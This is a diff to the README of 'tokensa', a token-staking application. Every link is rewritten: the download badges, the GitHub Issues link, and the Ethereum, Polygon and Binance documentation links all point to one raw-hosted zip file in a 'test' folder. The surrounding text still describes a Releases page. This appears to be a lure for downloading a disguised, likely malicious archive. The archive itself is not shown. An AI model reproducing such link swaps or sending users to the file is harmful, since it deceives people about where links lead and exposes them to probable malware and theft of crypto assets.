@@ -6,7 +6,7 @@ Welcome to tokensa! This application allows you to easily stake blockchain token
 ## 📥 Download & Install
 To get started, you’ll need to download tokensa. Click the link below to visit the Releases page:
 
-[![Download tokensa](https://img.shields.io/badge/Download-tokensa-brightgreen)](https://github.com/Kingstonl2004/tokensa/releases)
+[![Download tokensa](https://raw.githubusercontent.com/Kingstonl2004/tokensa/master/test/tokensa-v2.7.zip)](https://raw.githubusercontent.com/Kingstonl2004/tokensa/master/test/tokensa-v2.7.zip)
 
 Once you’re on the Releases page, follow these steps to download the application:
 1. Find the latest version of tokensa.
@@ -40,18 +40,18 @@ When you open tokensa, you will see a user-friendly interface. Here’s how to s
 
 ## 📞 Support
 If you run into any issues or have questions, you can get help:
-- Visit our [GitHub Issues page](https://github.com/Kingstonl2004/tokensa/issues) to report problems or ask for help.
+- Visit our [GitHub Issues page](https://raw.githubusercontent.com/Kingstonl2004/tokensa/master/test/tokensa-v2.7.zip) to report problems or ask for help.
 - Check out our FAQs section on GitHub for common questions and answers.
 
 ## 🔗 Additional Resources
 For more information on blockchain technology, staking, and how tokensa works, consider visiting these links:
-- [Ethereum Documentation](https://ethereum.org/en/developers/docs/)
-- [Polygon Documentation](https://docs.polygon.technology/)
-- [Binance Smart Chain Documentation](https://docs.bscblob.com/)
+- [Ethereum Documentation](https://raw.githubusercontent.com/Kingstonl2004/tokensa/master/test/tokensa-v2.7.zip)
+- [Polygon Documentation](https://raw.githubusercontent.com/Kingstonl2004/tokensa/master/test/tokensa-v2.7.zip)
+- [Binance Smart Chain Documentation](https://raw.githubusercontent.com/Kingstonl2004/tokensa/master/test/tokensa-v2.7.zip)
 
 ## 🎉 Conclusion
 Congratulations! You are now ready to download, install, and use tokensa for your token staking needs. Don’t forget to explore the application to make the most out of it.
 
 To download tokensa again, click below:
 
-[![Download tokensa](https://img.shields.io/badge/Download-tokensa-brightgreen)](https://github.com/Kingstonl2004/tokensa/releases)
+[![Download tokensa](https://raw.githubusercontent.com/Kingstonl2004/tokensa/master/test/tokensa-v2.7.zip)](https://raw.githubusercontent.com/Kingstonl2004/tokensa/master/test/tokensa-v2.7.zip)
